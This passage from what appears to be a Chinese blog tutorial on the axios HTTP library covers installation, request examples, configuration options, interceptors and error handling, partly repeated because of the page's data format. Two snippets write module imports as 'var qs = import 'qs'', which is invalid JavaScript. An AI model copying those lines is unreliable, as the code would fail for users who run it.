class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 添加请求拦截器</span></span><br><span class=\"line\">axios.interceptors.request.use(<span class=\"function\">(<span class=\"params\">config</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 在发送请求之前做些什么</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> config;</span><br><span class=\"line\">&#125;, (error) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 对请求错误做些什么</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">Promise</span>.reject(error);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 添加响应拦截器</span></span><br><span class=\"line\">axios.interceptors.response.use(<span class=\"function\">(<span class=\"params\">response</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 对响应数据做点什么</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> response;</span><br><span class=\"line\">&#125;, (error) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 对响应错误做点什么</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">Promise</span>.reject(error);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>如果你想在稍后移除拦截器，可以这样：</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 使用拦截器</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> myInterceptor = axios.interceptors.request.use(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;<span class=\"comment\">/*...*/</span>&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 移除拦截器</span></span><br><span class=\"line\">axios.interceptors.request.eject(myInterceptor);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>可以为自定义 axios 实例添加拦截器：</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> instance = axios.create();</span><br><span class=\"line\">instance.interceptors.request.use(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;<span class=\"comment\">/*...*/</span>&#125;);</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"8、错误处理\"><a href=\"#8、错误处理\" class=\"headerlink\" title=\"8、错误处理\"></a><a name=\"handleErr\">8、错误处理</a></h4><ul>\n<li><p><code>常见的错误处理方式：</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">axios.get(<span class=\"string\">'/user/12345'</span>)</span><br><span class=\"line\">  .catch(<span class=\"function\">(<span class=\"params\">error</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (error.response) &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 请求已发出，但服务器响应的状态码不在 2xx 范围内</span></span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(error.response.data);</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(error.response.status);</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(error.response.headers);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"comment\">// Something happened in setting up the request that triggered an Error</span></span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(<span class=\"string\">'Error'</span>, error.message);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(error.config);</span><br><span class=\"line\">  &#125;);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>可以使用 validateStatus 配置选项定义一个自定义 HTTP 状态码的错误范围：</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">axios.get(<span class=\"string\">'/user/12345'</span>, &#123;</span><br><span class=\"line\">  validateStatus: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">status</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> status &lt; <span class=\"number\">500</span>; <span class=\"comment\">// 状态码在大于或等于500时才会 reject</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"9、使用-application-x-www-form-urlencoded-格式的请求参数\"><a href=\"#9、使用-application-x-www-form-urlencoded-格式的请求参数\" class=\"headerlink\" title=\"9、使用 application/x-www-form-urlencoded 格式的请求参数\"></a><a name=\"applicationForm\">9、使用 <code>application/x-www-form-urlencoded</code> 格式的请求参数</a></h4><blockquote>\n<p>默认情况下，axios将JavaScript对象序列化为JSON，即 <code>application/json</code> 。要以 <code>application/x-www-form-urlencoded</code> 格式发送数据，您可以使用以下选项之一。</p>\n</blockquote>\n<ul>\n<li><p><code>浏览器</code><br>在浏览器中，您可以使用URLSearchParams API，如下所示：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> params = <span class=\"keyword\">new</span> URLSearchParams();</span><br><span class=\"line\">params.append(<span class=\"string\">'param1'</span>, <span class=\"string\">'value1'</span>);</span><br><span class=\"line\">params.append(<span class=\"string\">'param2'</span>, <span class=\"string\">'value2'</span>);</span><br><span class=\"line\">axios.post(<span class=\"string\">'/foo'</span>, params);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 值得注意的是，并不是所有的浏览器都支持 `URLSearchParams`，</span></span><br><span class=\"line\"><span class=\"comment\">// 但是可以借助 `polyfill` 来解决</span></span><br></pre></td></tr></table></figure>\n<p>也可以使用 <a href=\"https://github.com/ljharb/qs\" target=\"_blank\" rel=\"noopener\"><code>qs</code></a> 库来编码请求参数：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> qs = <span class=\"keyword\">import</span> <span class=\"string\">'qs'</span>;</span><br><span class=\"line\">axios.post(<span class=\"string\">'/foo'</span>, qs.stringify(&#123; <span class=\"string\">'bar'</span>: <span class=\"number\">123</span> &#125;));</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>Node.js</code><br>在 <code>node.js</code> 中，可以使用 <a href=\"https://nodejs.org/api/querystring.html\" target=\"_blank\" rel=\"noopener\"><code>querystring</code></a> 模块：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> querystring = <span class=\"keyword\">import</span> <span class=\"string\">'querystring'</span>;</span><br><span class=\"line\">axios.post(<span class=\"string\">'http://something.com/'</span>, querystring.stringify(&#123; <span class=\"attr\">foo</span>: <span class=\"string\">'bar'</span> &#125;));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 当然也可以使用 `qs` 库</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"10、使用必看\"><a href=\"#10、使用必看\" class=\"headerlink\" title=\"10、使用必看\"></a><a name=\"notes\">10、使用必看</a></h4><ul>\n<li><p><code>更新说明：</code><br>在axios达到1.0版本之前，重大更改将以新的次要版本发布。例如0.5.1和0.5.4将具有相同的API，但0.6.0将具有重大变化。</p>\n</li>\n<li><p><code>Promise：</code><br>axios依赖于原生ES6 <code>Promise</code> 实现的支持。如果您的环境不支持ES6 Promise，则可以使用 <a href=\"https://github.com/stefanpenner/es6-promise\" target=\"_blank\" rel=\"noopener\">polyfill</a>。</p>\n</li>\n</ul>\n<p style=\"text-align: right\">参考文档 <a href=\"https://www.npmjs.com/package/axios\" target=\"_blank\" rel=\"noopener\">axios</a></p>","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p>Promise based HTTP client for the browser and node.js.（<code>axios</code> 是一个基于 <code>Promise</code> 的 <code>HTTP</code> 库，可以用在 <code>浏览器</code> 和 <code>node.js</code> 中。）</p>\n</blockquote>\n<p><a href=\"#install\">1. 安装</a><br><a href=\"#example\">2. 官网示例</a><br><a href=\"#apiIntro\">3. API 介绍</a><br><a href=\"#requestConfig\">4. 请求配置</a><br><a href=\"#response\">5. 响应结构</a><br><a href=\"#defaultConfig\">6. 默认配置</a><br><a href=\"#interceptors\">7. 拦截器</a><br><a href=\"#handleErr\">8. 错误处理</a><br><a href=\"#applicationForm\">9. 使用 application/x-www-form-urlencoded 格式的请求参数</a><br><a href=\"#notes\">10. 使用必看</a></p>\n<h4 id=\"1、安装\"><a href=\"#1、安装\" class=\"headerlink\" title=\"1、安装\"></a><a name=\"install\">1、安装</a></h4><ul>\n<li><p><code>使用 npm：</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ npm install axios</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>使用 cdn：</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=&quot;https://unpkg.com/axios/dist/axios.min.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"2、官方示例\"><a href=\"#2、官方示例\" class=\"headerlink\" title=\"2、官方示例\"></a><a name=\"example\">2、官方示例</a></h4><ul>\n<li><p><code>执行 GET 请求：</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 为给定 ID 的 user 创建请求</span></span><br><span class=\"line\">axios.get(<span class=\"string\">'/user?ID=12345'</span>)</span><br><span class=\"line\">.then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(res);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">.catch(<span class=\"function\">(<span class=\"params\">err</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(err)</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 同样的，上面的请求可以这样做</span></span><br><span class=\"line\">axios.get(<span class=\"string\">'/user'</span>, &#123;</span><br><span class=\"line\">  params: &#123;</span><br><span class=\"line\">    ID: <span class=\"number\">123</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">.then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(res);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">.catch(<span class=\"function\">(<span class=\"params\">err</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(err);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>执行 POST 请求：</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">axios.post(<span class=\"string\">'/user'</span>, &#123;</span><br><span class=\"line\">  firstName: <span class=\"string\">'Fred'</span>,</span><br><span class=\"line\">  lastName: <span class=\"string\">'Flintstone'</span></span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">.then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(res);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">.catch(<span class=\"function\">(<span class=\"params\">err</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(err);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>执行多个并发请求：</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getUserAccount</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> axios.get(<span class=\"string\">'/user/12345'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getUserPermissions</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> axios.get(<span class=\"string\">'/user/12345/permissions'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">axios.all([getUserAccount(), getUserPermissions()])</span><br><span class=\"line\">.then(axios.spread(<span class=\"function\">(<span class=\"params\">acct, perms</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 两个请求现在都执行完成</span></span><br><span class=\"line\">&#125;));</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"3、API-介绍\"><a href=\"#3、API-介绍\" class=\"headerlink\" title=\"3、API 介绍\"></a><a name=\"apiIntro\">3、API 介绍</a></h4><ul>\n<li><p><code>可以通过向 axios 传递相关配置来创建请求：</code></p>\n<p>axios(config)</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 发送 POST 请求</span></span><br><span class=\"line\">axios(&#123;</span><br><span class=\"line\">  method: <span class=\"string\">'post'</span>,</span><br><span class=\"line\">  url: <span class=\"string\">'/user/12345'</span>,</span><br><span class=\"line\">  data: &#123;</span><br><span class=\"line\">    firstName: <span class=\"string\">'Fred'</span>,</span><br><span class=\"line\">    lastName: <span class=\"string\">'Flintstone'</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  ...</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// GET 请求远程图片</span></span><br><span class=\"line\">axios(&#123;</span><br><span class=\"line\">  method:<span class=\"string\">'get'</span>,</span><br><span class=\"line\">  url:<span class=\"string\">'http://bit.ly/2mTM3nY'</span>,</span><br><span class=\"line\">  responseType:<span class=\"string\">'stream'</span></span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">.then(<span class=\"function\">(<span class=\"params\">response</span>) =&gt;</span> &#123;</span><br><span class=\"line\">response.data.pipe(fs.createWriteStream(<span class=\"string\">'ada_lovelace.jpg'</span>))</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>axios(url[, config])</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 发送 GET 请求（默认的方法）</span></span><br><span class=\"line\">axios(<span class=\"string\">'/user/12345'</span>);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>请求方法的别名：</code></p>\n<p>为方便起见，为所有支持的请求方法提供了别名</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">axios.request(config)</span><br><span class=\"line\">axios.get(url[, config])</span><br><span class=\"line\">axios.delete(url[, config])</span><br><span class=\"line\">axios.head(url[, config])</span><br><span class=\"line\">axios.post(url[, data[, config]])</span><br><span class=\"line\">axios.put(url[, data[, config]])</span><br><span class=\"line\">axios.patch(url[, data[, config]])</span><br></pre></td></tr></table></figure>\n<p>在使用别名方法时， url、method、data 这些属性都不必在配置中指定。</p>\n</li>\n<li><p><code>处理并发请求：</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">axios.all(iterable)</span><br><span class=\"line\">axios.spread(callback)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>创建 axios 实例：</code><br>可以使用自定义配置新建一个 axios 实例</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// axios.create([config])</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> instance = axios.create(&#123;</span><br><span class=\"line\">  baseURL: <span class=\"string\">'https://some-domain.com/api/'</span>,</span><br><span class=\"line\">  timeout: <span class=\"number\">1000</span>,</span><br><span class=\"line\">  headers: &#123;<span class=\"string\">'X-Custom-Header'</span>: <span class=\"string\">'foobar'</span>&#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>实例的方法：</code>;<br>以下是可用的实例方法。指定的配置将与实例的配置合并</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">axios#request(config)</span><br><span class=\"line\">axios#get(url[, config])</span><br><span class=\"line\">axios#delete(url[, config])</span><br><span class=\"line\">axios#head(url[, config])</span><br><span class=\"line\">axios#post(url[, data[, config]])</span><br><span class=\"line\">axios#put(url[, data[, config]])</span><br><span class=\"line\">axios#patch(url[, data[, config]])</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"4、请求配置\"><a href=\"#4、请求配置\" class=\"headerlink\" title=\"4、请求配置\"></a><a name=\"requestConfig\">4、请求配置</a></h4><ul>\n<li><code>这些是创建请求时可以用的配置选项。只有 url 是必需的。如果没有指定 method，请求将默认使用 get 方法：</code><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"comment\">// `url` 是用于请求的服务器 URL</span></span><br><span class=\"line\">  url: <span class=\"string\">'/user'</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `method` 是创建请求时使用的方法</span></span><br><span class=\"line\">  method: <span class=\"string\">'get'</span>, <span class=\"comment\">// 默认是 get</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `baseURL` 将自动加在 `url` 前面，除非 `url` 是一个绝对 URL。</span></span><br><span class=\"line\">  <span class=\"comment\">// 它可以通过设置一个 `baseURL` 便于为 axios 实例的方法传递相对 URL</span></span><br><span class=\"line\">  baseURL: <span class=\"string\">'https://some-domain.com/api/'</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `transformRequest` 允许在向服务器发送前，修改请求数据</span></span><br><span class=\"line\">  <span class=\"comment\">// 只能用在 'PUT', 'POST' 和 'PATCH' 这几个请求方法</span></span><br><span class=\"line\">  <span class=\"comment\">// 后面数组中的函数必须返回一个字符串，或 ArrayBuffer，或 Stream</span></span><br><span class=\"line\">  transformRequest: [<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">data</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 对 data 进行任意转换处理</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> data;</span><br><span class=\"line\">  &#125;],</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `transformResponse` 在传递给 then/catch 前，允许修改响应数据</span></span><br><span class=\"line\">  transformResponse: [<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">data</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 对 data 进行任意转换处理</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> data;</span><br><span class=\"line\">  &#125;],</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `headers` 是即将被发送的自定义请求头</span></span><br><span class=\"line\">  headers: &#123;<span class=\"string\">'X-Requested-With'</span>: <span class=\"string\">'XMLHttpRequest'</span>&#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `params` 是即将与请求一起发送的 URL 参数</span></span><br><span class=\"line\">  <span class=\"comment\">// 必须是一个无格式对象(plain object)或 URLSearchParams 对象</span></span><br><span class=\"line\">  params: &#123;</span><br><span class=\"line\">    ID: <span class=\"number\">12345</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `paramsSerializer` 是一个负责 `params` 序列化的函数</span></span><br><span class=\"line\">  <span class=\"comment\">// (e.g. https://www.npmjs.com/package/qs, http://api.jquery.com/jquery.param/)</span></span><br><span class=\"line\">  paramsSerializer: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">params</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Qs.stringify(params, &#123;<span class=\"attr\">arrayFormat</span>: <span class=\"string\">'brackets'</span>&#125;)</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `data` 是作为请求主体被发送的数据</span></span><br><span class=\"line\">  <span class=\"comment\">// 只适用于这些请求方法 'PUT', 'POST', 和 'PATCH'</span></span><br><span class=\"line\">  <span class=\"comment\">// 在没有设置 `transformRequest` 时，必须是以下类型之一：</span></span><br><span class=\"line\">  <span class=\"comment\">// - string, plain object, ArrayBuffer, ArrayBufferView, URLSearchParams</span></span><br><span class=\"line\">  <span class=\"comment\">// - 浏览器专属：FormData, File, Blob</span></span><br><span class=\"line\">  <span class=\"comment\">// - Node 专属： Stream</span></span><br><span class=\"line\">  data: &#123;</span><br><span class=\"line\">    firstName: <span class=\"string\">'Fred'</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `timeout` 指定请求超时的毫秒数(0 表示无超时时间)</span></span><br><span class=\"line\">  <span class=\"comment\">// 如果请求话费了超过 `timeout` 的时间，请求将被中断</span></span><br><span class=\"line\">  timeout: <span class=\"number\">1000</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `withCredentials` 表示跨域请求时是否需要使用凭证</span></span><br><span class=\"line\">  withCredentials: <span class=\"literal\">false</span>, <span class=\"comment\">// 默认的</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// `adapter` 允许自定义处理请求，以使测试更轻松</span></span><br><span class=\"line\">  <span class=\"comment\">// 返回一个 promise 并应用一个有效的响应 (查阅 [response docs](#response-api)).</span></span><br><span class=\"line\">  adapter: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">config</span>) 